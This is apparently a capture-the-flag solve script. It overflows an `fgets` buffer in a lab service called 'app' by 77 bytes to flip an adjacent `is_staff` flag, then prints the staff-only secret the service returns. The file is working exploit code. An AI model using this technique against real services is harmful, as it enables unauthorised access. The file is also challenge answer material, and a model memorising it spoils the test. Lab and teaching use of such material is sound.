"""`fgets` accepts 4x the buffer's declared size, so 76 bytes of filler reach
the adjacent `is_staff` flag before the function checks it; see solve/README.md
for the disassembly that found this offset."""
import socket
import sys

HOST, PORT = 'app', 9100
OFFSET = 77  # `is_staff` sits 76 bytes past `name`'s start; one more filler byte
             # keeps its first byte as 'A' after the trim below rewrites the newline


def main():
    payload = b'A' * OFFSET + b'\n'
    with socket.create_connection((HOST, PORT), timeout=10) as sock:
        sock.settimeout(10)
        sock.sendall(payload)
        sock.shutdown(socket.SHUT_WR)
        data = b''
        while True:
            chunk = sock.recv(4096)
            if not chunk:
                break
            data += chunk
    text = data.decode('utf-8', 'replace')
    for line in text.splitlines():
        if line.startswith('직원 전용 자료: '):
            print(line.split(': ', 1)[1].strip())
            return
    print('overflow no longer reaches the staff branch: ' + text, file=sys.stderr)
    raise SystemExit(3)


if __name__ == '__main__':
    main()
